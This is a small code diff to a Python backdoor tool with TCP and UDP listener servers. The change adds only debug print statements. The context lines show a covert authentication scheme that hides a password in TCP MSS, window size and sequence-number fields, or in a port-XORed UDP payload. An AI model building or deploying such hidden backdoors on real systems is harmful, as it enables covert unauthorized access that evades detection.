@@ -272,7 +272,7 @@ class TcpBackdoorServer(BackdoorServer):
     def listen(self):
         # Create a new random source port from which to send
         self.sport = RandShort()
-
+        print("entered the TCP Listen")
         # If MSS option + window size + ISN == the password and the traffic is bound for the correct port, we probably have a client
         def is_auth(packet):
             if len(packet["TCP"].options) == 0:
@@ -327,7 +327,7 @@ class UdpBackdoorServer(BackdoorServer):
     def listen(self):
         # Create a new random source port from which to send
         self.sport = RandShort()
-
+        print("entered the UDP Listen")
         # If payload xor ((packet["UDP"].sport << 48) + (packet["UDP"].sport << 32) + (packet["UDP"].sport << 16) + (packet["UDP"].sport)) == pw, we have a client
         def is_auth(packet):
             if len(packet["UDP"].payload) != 8:
